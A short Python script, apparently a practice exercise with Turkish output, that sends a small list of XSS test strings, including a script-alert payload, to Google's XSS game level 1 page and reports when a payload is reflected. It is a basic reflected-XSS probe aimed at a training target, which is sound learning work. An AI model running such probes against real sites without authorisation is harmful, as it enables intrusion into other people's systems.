import requests
#header={"Cookie": "__cfduid=d971d240fb2d9f3bfca31bd182664dbd01599769242"}
xss_liste=["siber","<h1>siber","<script>alert('Xss test')</script>"]
for payload  in xss_liste:
    print(payload)
    url="https://xss-game.appspot.com/level1/frame?query="+str(payload)
   # sonuc=requests.get(url=url,headers=header)
    sonuc = requests.get(url=url)
    if str(payload) in str(sonuc.content):
        print("Muhtemelen XSS var",str(payload))
